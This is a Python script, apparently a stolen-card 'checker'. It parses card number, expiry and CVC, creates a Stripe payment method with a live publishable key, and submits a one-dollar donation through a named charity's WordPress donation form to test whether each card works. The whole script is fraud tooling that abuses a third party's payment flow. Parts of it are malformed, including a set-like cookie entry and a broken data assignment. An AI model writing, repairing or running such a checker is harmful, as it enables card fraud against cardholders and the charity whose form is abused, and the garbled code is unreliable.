import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    '__stripe_mid=cc134ea7-828d-4ed3-86dc-834a9eb4292e2cbdb5',
	    '__stripe_sid': '1a2d988a-3479-445a-848e-3cf0269cd98af8defc',
	}
	
	headers = {
	    'authority': 'golf316.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=cc134ea7-828d-4ed3-86dc-834a9eb4292e2cbdb5; __stripe_sid=a20796ea-226d-4e43-9893-02d9b5e38119a42bed',
	    'origin': 'https://golf316.org',
	    'pragma': 'no-cache',
	    'referer': 'https://golf316.org/donations/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1725376205549',
	}
	
	data = '__fluent_form_embded_post_id=2161&_fluentform_7_fluentformnonce=69bf5ff950&_wp_http_referer=%2Fdonations%2F&names%5Bfirst_name%5D=Sai&names%5Blast_name%5D=Lauo&email=binsharpoe%40gmail.com&payment_input=Other&custom-payment-amount=1&payment_method=stripe&__entry_intermediate_hash=80e40ab22055f1637efdb560b5b2e993&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '7',
	}
	
	r2 = requests.post('https://golf316.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	return (r2.json())
